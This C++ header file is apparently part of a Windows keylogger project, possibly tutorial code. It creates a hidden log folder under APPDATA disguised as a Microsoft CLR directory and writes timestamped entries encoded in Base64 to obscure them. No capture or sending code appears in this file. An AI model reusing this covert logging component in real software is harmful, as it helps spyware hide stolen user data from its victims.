#ifndef IO_H
#define IO_H

#include <string>
#include <cstdlib>
#include <fstream>
#include "windows.h"
#include "Helper.h"
#include "Base64.h"

namespace IO
{
    std::string GetOurPath(const bool append_seperator = false)
    {
        std::string appdata_dir(getenv("APPDATA"));
        //getenv-----getenvironment
        //APPDATA----to get system user
        std::string full=appdata_dir + "\\Microsoft\\CLR";
        return full+(append_seperator ? "\\" : "");

    }

    bool MkOneDr(std::string path)
    {
         return (bool)CreateDirectory(path.c_str(),NULL) ||
         GetLastError() == ERROR_ALREADY_EXISTS;
    }
    //C:\USERS\test\Downloads
    //if u are going to downloads through this path and if
    //one of the subfolder in the way is not present..then error will throw it to this function

    bool MKDir(std::string path)
    {
        for(char &c : path)
            if(c=='\\')
            {
                c='\0';
                if(!MkOneDr(path))
                    return false;
                c='\\';
            }
            return true;

    }
     template <class T>
   //  std::string WriteLog(const T &t)
     //{

         std::string WriteLog(const T &t)
         {
             std::string path = GetOurPath(true);
             //std::string name=dt.GetDateTimeString("_") + ".log";
             Helper::DateTime dt;
             std::string name = dt.GetDateTimeString("_")  + ".log";

             try
             {
                 std::ofstream file(path + name);
                 if(!file) return"";
                 std::ostringstream s;
                 s<<"["<<dt.GetDateTimeString()<<"]"<<
                 std::endl<<t<<std::endl;
                 std::string data =Base64::EncryptB64(s.str());
                 file<<data;
                 if(!file)
                    return "";
                 file.close();
                 return name;
              }
              catch(...)
              {
                  return "";
              }
         }
    // }
}
#endif // IO_H
